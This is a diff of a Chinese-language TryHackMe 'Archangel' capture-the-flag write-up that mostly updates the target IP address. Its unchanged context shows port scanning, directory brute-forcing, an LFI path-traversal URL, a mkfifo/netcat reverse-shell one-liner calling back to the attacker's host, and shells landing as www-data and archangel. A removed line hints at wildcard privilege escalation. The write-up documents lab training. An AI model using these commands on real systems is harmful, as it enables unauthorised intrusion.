@@ -4,10 +4,10 @@
 # 发现服务
 ```
 ┌──(root💀kali)-[~/tryhackme/Archangel]
-└─# nmap -sV -Pn 10.10.82.158     
+└─# nmap -sV -Pn 10.10.228.134     
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-29 05:43 EDT
-Nmap scan report for 10.10.82.158
+Nmap scan report for 10.10.228.134
 Host is up (0.32s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
@@ -23,25 +23,25 @@ Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
 ## 爆破目录
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -u http://10.10.82.158                                                                        
+└─# python3 dirsearch.py -e* -t 100 -u http://10.10.228.134                                                                        
 
   _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                            
  (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                             
 Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492
 
-Output File: /root/dirsearch/reports/10.10.82.158/_21-10-29_06-02-36.txt
+Output File: /root/dirsearch/reports/10.10.228.134/_21-10-29_06-02-36.txt
 
 Error Log: /root/dirsearch/logs/errors-21-10-29_06-02-36.log
 
-Target: http://10.10.82.158/
+Target: http://10.10.228.134/
 
 [06:02:37] Starting:                                         
-[06:03:59] 301 -  312B  - /flags  ->  http://10.10.82.158/flags/            
-[06:04:06] 301 -  313B  - /images  ->  http://10.10.82.158/images/          
+[06:03:59] 301 -  312B  - /flags  ->  http://10.10.228.134/flags/            
+[06:04:06] 301 -  313B  - /images  ->  http://10.10.228.134/images/          
 [06:04:06] 200 -    0B  - /images/                                          
 [06:04:08] 200 -   19KB - /index.html                                       
-[06:04:29] 301 -  312B  - /pages  ->  http://10.10.82.158/pages/            
+[06:04:29] 301 -  312B  - /pages  ->  http://10.10.228.134/pages/            
 [06:04:30] 200 -    0B  - /pages/                                           
 [06:04:44] 403 -  277B  - /server-status    
 ```
@@ -51,7 +51,7 @@ Target: http://10.10.82.158/
 
 查看网页源代码，在```Send us a mail```里发现一个域名，把```mafialive.thm```写进host文件
 
-echo "10.10.82.158 mafialive.thm" >> /etc/hosts
+echo "10.10.228.134 mafialive.thm" >> /etc/hosts
 
 打开mafialive.thm发现flag1
 
@@ -195,7 +195,7 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 ┌──(root💀kali)-[~/tryhackme/Archangel]
 └─# nc -lnvp 4444
 listening on [any] 4444 ...
-connect to [10.13.21.169] from (UNKNOWN) [10.10.82.158] 54296
+connect to [10.13.21.169] from (UNKNOWN) [10.10.228.134] 54296
 /bin/sh: 0: can't access tty; job control turned off
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -243,7 +243,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/
 ┌──(root💀kali)-[~/tryhackme/Archangel]
 └─# nc -lnvp 4242 
 listening on [any] 4242 ...
-connect to [10.13.21.169] from (UNKNOWN) [10.10.82.158] 37592
+connect to [10.13.21.169] from (UNKNOWN) [10.10.228.134] 37592
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 archangel
@@ -275,6 +275,5 @@ u+UH
 cp /home/user/archangel/myfiles/* /opt/backupfiles
 ```
 
-把```/home/user/archangel/myfiles/```路径下的所有文件 拷贝到```/opt/backupfiles```
-这个通配符```*```也许可以利用来提权,如果我们把文件的名字变成一个个命令的话
+
 
